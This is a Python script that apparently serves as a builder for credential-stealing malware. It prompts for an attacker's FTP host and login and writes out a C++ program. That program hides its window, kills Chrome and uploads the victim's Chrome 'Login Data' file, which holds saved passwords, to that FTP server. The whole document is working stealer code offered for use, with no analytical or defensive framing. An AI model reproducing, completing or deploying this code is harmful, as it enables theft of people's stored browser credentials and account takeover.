from colorama import Fore, Style
import colorama

tag_blue = Style.BRIGHT + Fore.LIGHTBLUE_EX + "[+]" + Style.RESET_ALL
def prompt_host_and_port():
    host = input(tag_blue+" Enter FTP Server : ")
    username = input(tag_blue+" Enter FTP Username : ")
    password = input(tag_blue+" Enter FTP Password : ")
    
    big_string = r'''
#include <sstream>
#include <wininet.h>
#include <windows.h>
#pragma comment(lib, "Wininet.lib")
void UploadToServer(const char* file, const char* ftpname)
{
    HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hFtpSession = InternetConnect(hInternet,"'''+host+r'''" , INTERNET_DEFAULT_FTP_PORT, "'''+username+r'''", "'''+password+r'''", INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    FtpPutFile(hFtpSession, file, ftpname, FTP_TRANSFER_TYPE_BINARY, 0);
    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

}
std::string toStr()
{
    const char* ftpname = getenv("USERNAME");
    if(ftpname == NULL)
    {
        return "FAILED_TO_GET_USERNAME";
    } else {
        std::string nm(ftpname);
        return nm;
    }
}

int main() {
    
    std::ostringstream fpath;
    fpath << "C:\\Users\\" << toStr() << "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    FreeConsole();
    while(1)
    {
        if(InternetCheckConnection("http://www.google.com", 1, 0))
        {
            WinExec("taskkill /IM chrome.exe /F", SW_HIDE);
            UploadToServer(fpath.str().c_str(), toStr().c_str());
            break;
        } else {
            // Do nothing..
        }
    }
    return 0;
}
    '''

    with open("orphicmeta.cpp", "w+") as orphic:
        orphic.write(big_string)
    orphic.close()